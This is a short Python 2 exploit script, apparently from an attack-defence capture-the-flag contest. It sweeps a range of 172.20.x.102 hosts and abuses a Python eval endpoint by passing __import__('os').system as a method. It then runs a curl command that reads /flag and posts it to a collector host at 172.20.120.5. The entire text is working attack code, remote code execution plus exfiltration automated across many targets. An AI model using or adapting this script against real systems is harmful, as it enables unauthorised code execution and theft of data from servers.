
import requests
import urllib
url="http://172.20.%d.102:8080/showpage/?" #py eval
for i in xrange(101,131,1):
    try:
        if i!=120:          
            ip="172.20.%d.102"%(i)
            ss=url%(i)
            st=urllib.urlencode({'method':'__import__(\"os\").system','param':"curl -d flag=%s:`cat /flag`  http://172.20.120.5/get.php"%(ip)})
            print ss+st
            x=requests.get(ss+st,timeout=2)
            print ip
    except:
        print i
        pass
